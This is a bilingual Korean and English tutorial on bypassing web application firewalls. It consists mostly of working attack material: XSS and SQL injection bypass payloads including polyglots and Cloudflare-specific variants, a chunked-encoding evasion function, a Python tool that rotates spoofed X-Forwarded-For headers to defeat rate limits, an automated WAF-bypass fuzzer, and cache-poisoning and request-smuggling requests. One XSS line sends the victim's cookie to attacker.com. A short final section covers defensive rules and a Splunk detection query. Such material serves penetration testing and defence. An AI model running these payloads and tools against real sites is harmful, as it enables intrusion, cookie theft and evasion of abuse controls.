> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# WAF 우회 & 고급 웹 공격 기법
> AI_Innovation_Studio | WAF Evasion & Advanced Web Attack Lab

---

## 0. 초보자를 위한 개념 이해

### WAF와 WAF 우회란?

WAF(Web Application Firewall)는 웹 애플리케이션 앞단에서 악성 HTTP 요청을 탐지하고 차단하는 보안 장치입니다. SQL Injection, XSS 등의 공격 패턴을 감지하지만, 공격자는 이 탐지 패턴을 우회하는 기법을 사용합니다.

**왜 배우는가:**
```
WAF가 있어도 공격이 성공하는 이유:

  WAF 탐지: SELECT, UNION, script, onerror 등 패턴 차단

  우회 기법:
  대소문자:    SeLeCt * FrOm users
  인코딩:      %53%45%4C%45%43%54 (URL 인코딩)
  주석 삽입:   SEL/**/ECT (MySQL 주석으로 분리)
  유니코드:    ＜script＞ (전각 문자)
  이중 인코딩: %2527 → %27 → '

  WAF 우회 이해의 필요성:
  공격자 입장: 실제 침투 성공률 향상
  방어자 입장: WAF 규칙의 한계 파악 → 더 강한 규칙 작성
  버그바운티:  WAF 우회 성공 시 높은 보상
```

### 핵심 개념 정리

```
WAF 탐지 → 우회 사이클:

  WAF 규칙:  "UNION SELECT" 차단
  우회 1:    UNION/**/SELECT (주석 삽입)
  WAF 업데이트: UNION/**/SELECT도 차단
  우회 2:    /*!UNION*/ SELECT (MySQL 조건부 주석)
  WAF 업데이트: ...
  (무한 반복)

WAF 핑거프린팅:
  정상 요청과 공격 요청의 응답 코드 비교
  403 → 대부분의 WAF 차단 코드
  406 Not Acceptable → 일부 WAF
  499 → Cloudflare 등 CDN WAF
  응답 헤더에 WAF 제품명이 노출되는 경우도 있음

주요 인코딩 기법:
  URL 인코딩:   ' → %27   <  → %3C
  HTML 엔티티:  < → &lt;  " → &quot;
  Base64:      UNION → VU5JT04=
  유니코드 이스케이프: ' → '
```

### 필요한 도구 및 환경
- **프록시**: Burp Suite — Repeater 탭에서 다양한 인코딩/우회 페이로드 수동 테스트
- **WAF 탐지 도구**: wafw00f — 대상 사이트의 WAF 제품 자동 탐지
- **페이로드 목록**: PayloadsAllTheThings(GitHub) — WAF 우회 기법 정리된 공개 저장소

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""WAF 우회 페이로드 생성기 — 인코딩 변형 (교육용)."""
from urllib.parse import quote, quote_plus
import base64
from typing import Callable

def generate_sqli_bypass_variants(base_payload: str) -> list[dict[str, str]]:
    """SQL Injection 페이로드의 WAF 우회 변형 목록 생성."""
    variants: list[dict[str, str]] = [
        {"방법": "원본", "페이로드": base_payload},
        {"방법": "URL 인코딩", "페이로드": quote(base_payload)},
        {"방법": "이중 URL 인코딩", "페이로드": quote(quote(base_payload))},
        {"방법": "대소문자 혼용", "페이로드": "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(base_payload)
        )},
        {"방법": "MySQL 주석 삽입",
         "페이로드": base_payload.replace(" ", "/**/")},
        {"방법": "MySQL 조건부 주석",
         "페이로드": base_payload.replace("SELECT", "/*!SELECT*/")},
    ]
    return variants

def test_waf_response(url: str, payload: str) -> str:
    """WAF 차단 여부 확인 (실제 요청 없이 시뮬레이션)."""
    blocked_patterns = ["UNION SELECT", "' OR '", "<script>"]
    for pattern in blocked_patterns:
        if pattern.lower() in payload.lower():
            return "차단 (WAF 규칙 일치)"
    return "통과 (우회 성공 가능성)"

if __name__ == "__main__":
    test_payload = "' UNION SELECT username, password FROM users --"
    print("WAF 우회 변형 페이로드:")
    for variant in generate_sqli_bypass_variants(test_payload):
        status = test_waf_response("http://example.com", variant["페이로드"])
        print(f"  [{variant['방법']}] {status}")
        print(f"    {variant['페이로드'][:60]}...")
```

---

## 1. WAF 탐지 및 핑거프린팅

### WAF 존재 확인

```bash
# 기본 요청 vs 악성 페이로드 요청 비교
curl -I https://target.com/                              # 정상
curl -I "https://target.com/?id=1' OR '1'='1"           # SQL Injection
curl -I "https://target.com/?q=<script>alert(1)</script>"  # XSS

# 403/406/419/429 → WAF 차단
# Retry-After 헤더 → Rate Limit WAF

# wafw00f 도구 (자동 WAF 탐지)
pip install wafw00f
wafw00f https://target.com
wafw00f https://target.com -a  # 모든 WAF 탐지 시도
```

### 주요 WAF 핑거프린팅

| WAF | 탐지 특징 |
|-----|---------|
| **Cloudflare** | `CF-RAY` 헤더, `Server: cloudflare`, 1020/1015 에러 페이지 |
| **AWS WAF** | `x-amzn-RequestId`, `x-amz-apigw-id` 헤더 |
| **Akamai** | `X-Check-Cacheable`, `Akamai-Cache-Status` 헤더 |
| **F5 BIG-IP** | `X-WA-Info`, `TS*` 접두사 쿠키 |
| **ModSecurity** | `Mod_Security`, `NOYB` 헤더, "Not Acceptable" 응답 |
| **Imperva** | `X-Iinfo` 헤더, `visid_incap_*` 쿠키 |
| **Barracuda** | `barra_counter_session` 쿠키 |

```python
#!/usr/bin/env python3
"""WAF 핑거프린팅 도구 — HTTP 응답 헤더와 쿠키로 WAF 제품을 식별합니다."""

from __future__ import annotations
import argparse
import httpx
from dataclasses import dataclass

WAF_SIGNATURES: dict[str, dict[str, list[str]]] = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status"],
        "cookies": ["__cfduid", "cf_clearance"],
        "server": ["cloudflare"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amz-apigw-id"],
        "cookies": [],
        "server": ["awselb"],
    },
    "Akamai": {
        "headers": ["x-check-cacheable", "akamai-cache-status"],
        "cookies": ["ak_bmsc"],
        "server": ["akamaighost"],
    },
    "F5 BIG-IP": {
        "headers": ["x-wa-info"],
        "cookies": ["bigipserver", "ts"],
        "server": ["bigip"],
    },
    "ModSecurity": {
        "headers": ["server"],
        "cookies": [],
        "server": ["mod_security", "modsecurity"],
    },
    "Imperva": {
        "headers": ["x-iinfo"],
        "cookies": ["visid_incap_", "incap_ses_"],
        "server": [],
    },
}


@dataclass
class WAFResult:
    detected: bool
    product: str = "Unknown"
    confidence: str = "low"
    evidence: list[str] = None

    def __post_init__(self) -> None:
        if self.evidence is None:
            self.evidence = []


def detect_waf(url: str, timeout: float = 10.0) -> WAFResult:
    """URL에서 WAF를 탐지합니다."""
    # 악성 페이로드로 요청해 WAF 응답 유도
    test_urls = [
        url,
        f"{url}?id=1' OR '1'='1",
        f"{url}?q=<script>alert(1)</script>",
    ]

    headers_seen: dict[str, str] = {}
    cookies_seen: dict[str, str] = {}
    status_codes: list[int] = []

    with httpx.Client(verify=False, follow_redirects=True, timeout=timeout) as client:
        for test_url in test_urls:
            try:
                resp = client.get(test_url)
                status_codes.append(resp.status_code)
                headers_seen.update({k.lower(): v.lower() for k, v in resp.headers.items()})
                cookies_seen.update({k.lower(): v.lower() for k, v in resp.cookies.items()})
            except Exception:
                continue

    # WAF 차단 응답 코드 확인
    blocked = any(code in (403, 406, 419, 429, 503) for code in status_codes)

    # 시그니처 매칭
    for waf_name, sigs in WAF_SIGNATURES.items():
        evidence = []
        matches = 0

        for header in sigs["headers"]:
            if header in headers_seen:
                evidence.append(f"헤더: {header}={headers_seen[header][:50]}")
                matches += 1

        for cookie in sigs["cookies"]:
            for cookie_key in cookies_seen:
                if cookie_key.startswith(cookie):
                    evidence.append(f"쿠키: {cookie_key}")
                    matches += 1

        for server_sig in sigs["server"]:
            server_header = headers_seen.get("server", "")
            if server_sig in server_header:
                evidence.append(f"Server: {server_header}")
                matches += 1

        if matches >= 1:
            confidence = "high" if matches >= 2 else "medium"
            return WAFResult(
                detected=True,
                product=waf_name,
                confidence=confidence,
                evidence=evidence,
            )

    return WAFResult(detected=blocked, product="Unknown" if blocked else "없음")


def main() -> None:
    parser = argparse.ArgumentParser(description="WAF 핑거프린팅 도구")
    parser.add_argument("url", help="대상 URL")
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args()

    result = detect_waf(args.url, args.timeout)
    if result.detected:
        print(f"[!] WAF 탐지: {result.product} (신뢰도: {result.confidence})")
        for ev in result.evidence:
            print(f"    → {ev}")
    else:
        print("[+] WAF 없음 또는 탐지 실패")


if __name__ == "__main__":
    main()
```

---

## 2. XSS WAF 필터 우회 기법 완전 치트시트

### 인코딩 기법

```html
<!-- 원본 페이로드 -->
<script>alert(1)</script>

<!-- HTML Entity 인코딩 -->
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- URL 인코딩 (Single) -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- URL 인코딩 (Double) -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Unicode 변형 -->
<script>alert(1)</script>

<!-- Base64 + eval -->
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- JavaScript URI -->
javascript:alert(1)
javaSCRIPT:alert(1)
java&#x0A;script:alert(1)
```

### script 태그 없는 XSS (이벤트 핸들러)

```html
<!-- 마우스/포인터 이벤트 -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert`1`">
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<div onmouseover=alert(1)>XSS</div>

<!-- HTML5 신규 태그/이벤트 -->
<details open ontoggle=alert(1)>
<audio autoplay onerror=alert(1) src=x>
<video autoplay onerror=alert(1) src=x>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>XSS</marquee>
<meter onmouseover=alert(1)>XSS</meter>

<!-- CSS 기반 XSS -->
<link rel=stylesheet href=data:text/css,*{background:url('javascript:alert(1)')}>
<style>body{background:url('javascript:alert(1)')}</style>

<!-- 폼 액션 -->
<form action=javascript:alert(1)><input type=submit value=XSS>
<button formaction=javascript:alert(1)>XSS</button>
```

### WAF 우회 문자 조작 기법

```html
<!-- Null byte 삽입 -->
<scri\0pt>alert(1)</scri\0pt>

<!-- 주석 삽입 -->
<scr<!--comment-->ipt>alert(1)</script>
<scr/**/ipt>alert(1)</script>

<!-- 탭/줄바꿈/공백 -->
<img	src=x onerror=alert(1)>   (탭)
<img
src=x onerror=alert(1)>       (줄바꿈)

<!-- 대소문자 혼합 -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- HTML5 자동 닫기 -->
<svg><script>alert(1)</script>  (SVG 컨텍스트)

<!-- 속성 따옴표 없이 -->
<img src=x onerror=alert(1) />
```

### Polyglot XSS 페이로드 (다중 컨텍스트 작동)

```html
<!-- HTML/JS/URL 컨텍스트 모두 작동 -->
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- 속성값/태그 내/JS 스트링 모두 작동 -->
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
```

### Cloudflare 우회 (2024~2025 실전)

```html
<!-- Cloudflare가 막는 패턴 우회 -->
<svg/onload=&#97&#108&#101&#114&#116&#40&#49&#41>
<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
<details/open/ontoggle=self[`\x61lert`](1)>
<img src onerror=self['alert'](document['domain'])>
```

---

## 3. SQL Injection WAF 우회

```sql
-- 기본 페이로드
' UNION SELECT 1,2,3--

-- 키워드 분리
' UN/**/ION SE/**/LECT 1,2,3--
' UNI%00ON SELECT 1,2,3--

-- 줄바꿈으로 분리
' UNION%0ASELECT 1,2,3--
' UNION%0D%0ASELECT 1,2,3--

-- 대소문자 혼합
' uNiOn SeLeCt 1,2,3--

-- 동등 표현 치환
AND 1=1   →   AND 1 LIKE 1
AND 1=1   →   AND 1 BETWEEN 0 AND 2
OR        →   ||  (MySQL, SQLite)
UNION     →   UNION ALL

-- 공백 대체 문자
TAB (%09), 개행 (%0A), 폼피드 (%0C), 캐리지리턴 (%0D)
/**/, /%%/, %20+%20, ()

-- MySQL 주석 버전 우회
/*!UNION*/ /*!SELECT*/ 1,2,3
/*!50000UNION*/ SELECT 1,2,3  (MySQL 5.0.00+ 에서 실행)

-- HTTP 파라미터 오염 (HPP)
?id=1&id=UNION&id=SELECT&id=1,2,3--
?id=1 UNION/*&id=*/SELECT 1,2,3--

-- JSON 컨텍스트
{"id": "1 UNION SELECT 1,2,3--"}
{"id": 1, "order": "ASC; DROP TABLE users--"}
```

---

## 4. HTTP 레벨 WAF 우회 기법

### Chunked Transfer Encoding

```python
import socket

def send_chunked_payload(host: str, port: int, path: str, payload: str) -> str:
    """Chunked 전송으로 페이로드를 분할해 WAF를 우회합니다."""
    # 페이로드를 작은 청크로 분할
    chunk_size = 5
    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]

    body_parts = []
    for chunk in chunks:
        body_parts.append(f"{len(chunk):x}\r\n{chunk}\r\n")
    body_parts.append("0\r\n\r\n")  # 종료 청크

    chunked_body = "".join(body_parts)

    request = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{chunked_body}"
    )

    with socket.create_connection((host, port)) as sock:
        sock.sendall(request.encode())
        response = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data

    return response.decode(errors="replace")
```

청크 전송 인코딩으로 페이로드를 작은 조각으로 나눠 전송하면, WAF가 전체 페이로드를 재조합하지 못해 탐지를 우회할 수 있다.

### HTTP 메서드 Override

```http
POST /admin/delete HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
Content-Type: application/json

{"user_id": 123}

# 또는
POST /api/users/123 HTTP/1.1
X-Method-Override: PUT
_method=DELETE  (body에 추가)
```

### Content-Type 변조

```http
# JSON을 XML로 변조 (파서 혼동 유도)
POST /api/login HTTP/1.1
Content-Type: application/xml

<root><username>admin' OR '1'='1</username><password>x</password></root>

# 멀티파트로 변조
POST /api/search HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="query"

' UNION SELECT 1,2,3--
------Boundary--
```

---

## 5. X-Forwarded-For 주입 및 IP 스푸핑

### XFF 헤더 악용

```http
-- IP 화이트리스트 우회 (관리자 패널 접근)
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
```

### Rate Limiting 우회 (IP 로테이션)

```python
#!/usr/bin/env python3
"""
XFF 헤더 로테이션으로 Rate Limit을 우회하는 자동화 도구입니다.
"""

from __future__ import annotations
import argparse
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Iterator

import httpx


def generate_random_ip() -> str:
    """임의의 공인 IP를 생성합니다 (RFC 1918 제외)."""
    while True:
        octets = [random.randint(1, 254) for _ in range(4)]
        # 사설 IP 범위 제외
        if octets[0] in (10, 127, 192) or (octets[0] == 172 and 16 <= octets[1] <= 31):
            continue
        return ".".join(map(str, octets))


XFF_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Client-IP",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
    "X-Azure-ClientIP",
]


def make_request(
    url: str,
    method: str,
    data: dict | None,
    rotate_xff: bool,
    delay: float,
) -> dict:
    """단일 요청을 실행하고 결과를 반환합니다."""
    time.sleep(delay)
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

    if rotate_xff:
        fake_ip = generate_random_ip()
        xff_header = random.choice(XFF_HEADERS)
        headers[xff_header] = fake_ip

    try:
        with httpx.Client(verify=False, timeout=10.0) as client:
            if method.upper() == "POST":
                resp = client.post(url, data=data, headers=headers)
            else:
                resp = client.get(url, params=data, headers=headers)

        return {
            "status": resp.status_code,
            "length": len(resp.content),
            "xff_used": headers.get(xff_header if rotate_xff else "X-Forwarded-For", "none"),
            "body_sample": resp.text[:100],
        }
    except Exception as e:
        return {"error": str(e)}


def main() -> None:
    parser = argparse.ArgumentParser(description="XFF 로테이션 Rate Limit 우회 도구")
    parser.add_argument("url", help="대상 URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-d", "--data", nargs="*", help="POST 데이터 (key=value 형식)")
    parser.add_argument("-n", "--count", type=int, default=100, help="요청 횟수")
    parser.add_argument("--threads", type=int, default=5, help="동시 스레드 수")
    parser.add_argument("--delay", type=float, default=0.1, help="요청 간 딜레이 (초)")
    parser.add_argument("--no-xff", action="store_true", help="XFF 로테이션 비활성화")
    args = parser.parse_args()

    post_data = {}
    if args.data:
        for item in args.data:
            if "=" in item:
                k, v = item.split("=", 1)
                post_data[k] = v

    print(f"[*] 대상: {args.url}")
    print(f"[*] 요청 수: {args.count} | 스레드: {args.threads} | XFF 로테이션: {not args.no_xff}")

    results: list[dict] = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(
                make_request, args.url, args.method,
                post_data or None, not args.no_xff, args.delay
            )
            for _ in range(args.count)
        ]
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            if "status" in result:
                marker = "[+]" if result["status"] == 200 else "[x]"
                print(f"  {marker} {result['status']} | 길이: {result['length']} | XFF: {result['xff_used']}")

    # 통계
    status_counts: dict[int, int] = {}
    for r in results:
        if "status" in r:
            status_counts[r["status"]] = status_counts.get(r["status"], 0) + 1
    print(f"\n[*] 결과 통계: {status_counts}")


if __name__ == "__main__":
    main()
```

### XFF를 통한 SQL Injection

```http
-- 서버가 XFF 헤더를 로그 DB에 직접 INSERT하는 경우
GET /api/resource HTTP/1.1
X-Forwarded-For: 192.168.1.1', (SELECT password FROM users WHERE id=1))--
```

### XFF를 통한 XSS (로그 뷰어)

```http
-- 관리자 로그 뷰어가 XFF를 HTML로 렌더링하는 경우
GET / HTTP/1.1
X-Forwarded-For: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

---

## 6. Web Cache Poisoning

### 원리

```
캐시 키 = URL + Host + Accept-Encoding  (일반적)
캐시 키 제외 헤더 = X-Forwarded-Host, X-Forwarded-Scheme 등

공격: 캐시 키 제외 헤더를 악용해 악성 응답을 캐시에 저장
→ 이후 같은 URL을 요청하는 모든 사용자에게 악성 응답 제공
```

### 취약한 헤더 목록

```http
-- 테스트: 응답에 헤더 값이 반영되는지 확인
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: https
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: evil.com
X-Forwarded-Server: evil.com
```

### Cache Poisoning + DOM XSS

```http
-- 1단계: X-Forwarded-Host가 응답에 반영되는지 확인
GET / HTTP/1.1
X-Forwarded-Host: "><script>alert(1)</script>

-- 2단계: 응답에 <script src="//evil.com/script.js"> 반영 확인
-- 3단계: 캐시가 저장될 때까지 반복 요청
-- 4단계: 일반 사용자가 같은 URL 방문 → 캐시된 XSS 실행
```

### Web Cache Deception

```
공격자 → 피해자에게 링크 전송: https://target.com/account/info.css
피해자가 링크 클릭 → 인증된 계정 정보 페이지 응답
CDN이 .css 확장자로 오판하여 캐시에 저장
공격자 → 같은 URL 접근 → 피해자 계정 정보 획득
```

---

## 7. HTTP Request Smuggling 기초

### CL.TE (Content-Length + Transfer-Encoding 충돌)

```http
-- 프론트엔드: Content-Length 우선 처리
-- 백엔드: Transfer-Encoding 우선 처리

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL 공격

```http
-- 프론트엔드: Transfer-Encoding 우선
-- 백엔드: Content-Length 우선

POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

```bash
# smuggler.py 도구
pip install requests
python3 smuggler.py -u https://target.com -v
```

---

## 8. CDN/WAF 벤더별 우회 전략

### Cloudflare Origin IP 직접 접근

```bash
# Shodan으로 Origin IP 탐색
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str
shodan search "http.title:target.com" --fields ip_str

# Censys로 탐색
censys search "443.https.tls.certificate.parsed.names: target.com"

# SecurityTrails의 과거 DNS 레코드로 원래 IP 확인
# → Cloudflare 적용 전 IP가 여전히 서버 IP일 수 있음

# 직접 접근 시 Host 헤더 설정 필수
curl -H "Host: target.com" https://ORIGIN_IP/ --insecure
```

### AWS WAF JSON Injection 우회

```http
-- AWS WAF는 JSON 구조를 파싱함 → 유효한 JSON 내 인젝션
POST /api/search HTTP/1.1
Content-Type: application/json

{"q": {"$gt": ""}, "id": "1 UNION SELECT 1,2,3--"}

-- Base64 인코딩 우회 (앱이 Base64 디코딩 후 처리 시)
{"query": "MScgVU5JT04gU0VMRUNUIDEsMiwzLS0="}
```

### ModSecurity OWASP CRS 우회

```
Paranoia Level 1 (기본): 기본적인 공격만 탐지
Paranoia Level 4 (최고): 매우 엄격

PL1 우회:
  → 단순 인코딩, 대소문자 변형으로 충분

PL2 우회:
  → 다중 인코딩, 청크 전송

PL3/4 우회:
  → Anomaly Score 분산 (각 요청에 일부 페이로드만)
  → 여러 파라미터에 페이로드 분산
```

---

## 9. Python 3.10+ WAF 우회 자동화 도구

```python
#!/usr/bin/env python3
"""
WAF 우회 자동화 도구 — XSS/SQLi 페이로드의 다양한 인코딩을 시도하고
WAF 탐지 여부를 분석합니다.
"""

from __future__ import annotations
import argparse
import html
import json
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import StrEnum
from pathlib import Path

import httpx


class BypassTechnique(StrEnum):
    RAW = "raw"
    URL_ENCODE = "url_encode"
    DOUBLE_URL = "double_url"
    HTML_ENTITY = "html_entity"
    UNICODE = "unicode"
    MIXED_CASE = "mixed_case"
    COMMENT_INSERT = "comment_insert"


@dataclass
class TestResult:
    technique: str
    payload: str
    status_code: int
    response_length: int
    waf_blocked: bool
    latency_ms: float
    body_sample: str = ""


def encode_payload(payload: str, technique: BypassTechnique) -> str:
    """페이로드를 지정한 기법으로 인코딩합니다."""
    match technique:
        case BypassTechnique.RAW:
            return payload
        case BypassTechnique.URL_ENCODE:
            return urllib.parse.quote(payload, safe="")
        case BypassTechnique.DOUBLE_URL:
            return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        case BypassTechnique.HTML_ENTITY:
            return "".join(f"&#{ord(c)};" for c in payload)
        case BypassTechnique.UNICODE:
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        case BypassTechnique.MIXED_CASE:
            return "".join(
                c.upper() if i % 2 == 0 else c.lower()
                for i, c in enumerate(payload)
            )
        case BypassTechnique.COMMENT_INSERT:
            # SQL 주석 삽입 (SQL Injection용)
            import re
            return re.sub(r"\s+", "/**/", payload)
        case _:
            return payload


def test_payload(
    url: str,
    param: str,
    technique: BypassTechnique,
    payload: str,
    method: str = "GET",
    delay: float = 0.0,
) -> TestResult:
    """단일 페이로드를 테스트합니다."""
    time.sleep(delay)
    encoded = encode_payload(payload, technique)

    start = time.monotonic()
    try:
        with httpx.Client(verify=False, timeout=10.0) as client:
            if method == "GET":
                resp = client.get(url, params={param: encoded})
            else:
                resp = client.post(url, data={param: encoded})
        latency = (time.monotonic() - start) * 1000

        # WAF 차단 판단
        waf_blocked = resp.status_code in (403, 406, 419, 429, 503)

        return TestResult(
            technique=technique,
            payload=encoded[:80],
            status_code=resp.status_code,
            response_length=len(resp.content),
            waf_blocked=waf_blocked,
            latency_ms=latency,
            body_sample=resp.text[:100],
        )
    except Exception as e:
        return TestResult(
            technique=technique,
            payload=encoded[:80],
            status_code=0,
            response_length=0,
            waf_blocked=False,
            latency_ms=0.0,
            body_sample=str(e),
        )


XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<details open ontoggle=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT 1,2,3--",
    "1; DROP TABLE users--",
    "' AND SLEEP(5)--",
    "' ORDER BY 10--",
]


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WAF 우회 자동화 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    # XSS 테스트
    xss_parser = subparsers.add_parser("xss", help="XSS 우회 테스트")
    xss_parser.add_argument("url", help="대상 URL")
    xss_parser.add_argument("-p", "--param", default="q", help="파라미터명")
    xss_parser.add_argument("--threads", type=int, default=5)
    xss_parser.add_argument("--delay", type=float, default=0.2)

    # SQLi 테스트
    sqli_parser = subparsers.add_parser("sqli", help="SQLi 우회 테스트")
    sqli_parser.add_argument("url", help="대상 URL")
    sqli_parser.add_argument("-p", "--param", default="id", help="파라미터명")
    sqli_parser.add_argument("--threads", type=int, default=3)
    sqli_parser.add_argument("--delay", type=float, default=0.5)

    # 출력 옵션
    for sub in [xss_parser, sqli_parser]:
        sub.add_argument("-o", "--output", type=Path, help="결과 JSON 저장")

    args = parser.parse_args()

    payloads = XSS_PAYLOADS if args.command == "xss" else SQLI_PAYLOADS
    techniques = list(BypassTechnique)

    print(f"[*] 대상: {args.url}")
    print(f"[*] 파라미터: {args.param}")
    print(f"[*] 페이로드: {len(payloads)}개 × 기법: {len(techniques)}개 = {len(payloads)*len(techniques)}개 조합\n")

    all_results: list[TestResult] = []
    bypassed: list[TestResult] = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(
                test_payload, args.url, args.param, tech, payload,
                "GET", args.delay
            ): (tech, payload)
            for payload in payloads
            for tech in techniques
        }
        for future in as_completed(futures):
            result = future.result()
            all_results.append(result)
            status_icon = "[차단]" if result.waf_blocked else "[통과]"
            print(f"  {status_icon} {result.technique:15s} | {result.status_code} | {result.response_length:6d}B | {result.payload[:50]}")
            if not result.waf_blocked and result.status_code == 200:
                bypassed.append(result)

    print(f"\n{'='*60}")
    print(f"[+] WAF 우회 성공: {len(bypassed)}개")
    for r in bypassed:
        print(f"  → 기법: {r.technique} | 페이로드: {r.payload[:60]}")

    if args.output:
        data = [
            {
                "technique": r.technique,
                "payload": r.payload,
                "status_code": r.status_code,
                "waf_blocked": r.waf_blocked,
                "latency_ms": r.latency_ms,
            }
            for r in all_results
        ]
        args.output.write_text(json.dumps(data, indent=2, ensure_ascii=False))
        print(f"[*] 결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

XSS/SQLi 페이로드를 7가지 인코딩 기법으로 자동 변환해 WAF 탐지 여부를 분석하고, 우회에 성공한 페이로드를 찾아 보고한다.

---

## 10. 방어 및 탐지

### WAF 룰 작성 모범 사례

```
❌ 잘못된 WAF 룰 (우회 쉬움):
   block if request contains "script"
   → <SCRIPT>, <scr\nipt>, %3Cscript%3E 등으로 우회

✅ 올바른 WAF 룰 (심층 방어):
   1. 정규화 후 검사: URL 디코딩 → HTML 디코딩 → Unicode 정규화
   2. 컨텍스트 인식: 파라미터 유형별 다른 필터 (숫자/문자열/HTML)
   3. Positive 모델: 허용할 패턴만 정의 (Blocklist보다 Allowlist)
   4. 다층 탐지: WAF + RASP + IDS 결합
```

### ModSecurity + OWASP CRS 권장 설정

```apache
# modsecurity.conf
SecRuleEngine DetectionOnly  # 먼저 탐지만 → 분석 후 On으로 변경
SecRequestBodyAccess On
SecResponseBodyAccess Off    # 성능 최적화
SecAuditEngine RelevantOnly

# Paranoia Level 2 권장 (PL1은 너무 관대, PL3/4는 오탐 많음)
SecAction "id:900000,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=2"

# 이상 점수 임계값
SecAction "id:900110,phase:1,nolog,pass,t:none,setvar:tx.inbound_anomaly_score_threshold=10"
```

### 로그 분석으로 우회 시도 탐지

```spl
-- Splunk: WAF 우회 패턴 탐지
index=web_logs status=200
| eval payload=urldecode(uri_query)
| rex field=payload "(?i)(?P<xss><[^>]+on\w+=|<script|javascript:)|(?P<sqli>union.{0,20}select|or.{0,10}1=1)"
| where isnotnull(xss) OR isnotnull(sqli)
| eval attack_type=if(isnotnull(xss), "XSS", "SQLi")
| stats count by src_ip, attack_type, uri_path
| where count > 5
```

---

<a name="english"></a>

# WAF Bypass & Advanced Web Attack Techniques
> AI_Innovation_Studio | WAF Evasion & Advanced Web Attack Lab

---

## 1. WAF Detection and Fingerprinting

### Detecting WAF Presence

```bash
# Compare normal requests vs malicious payload requests
curl -I https://target.com/                              # Normal
curl -I "https://target.com/?id=1' OR '1'='1"           # SQL Injection
curl -I "https://target.com/?q=<script>alert(1)</script>"  # XSS

# 403/406/419/429 → WAF blocking
# Retry-After header → Rate Limit WAF

# wafw00f tool (automatic WAF detection)
pip install wafw00f
wafw00f https://target.com
wafw00f https://target.com -a  # Try all WAF detections
```

### Major WAF Fingerprinting

| WAF | Detection Characteristics |
|-----|--------------------------|
| **Cloudflare** | `CF-RAY` header, `Server: cloudflare`, 1020/1015 error pages |
| **AWS WAF** | `x-amzn-RequestId`, `x-amz-apigw-id` headers |
| **Akamai** | `X-Check-Cacheable`, `Akamai-Cache-Status` headers |
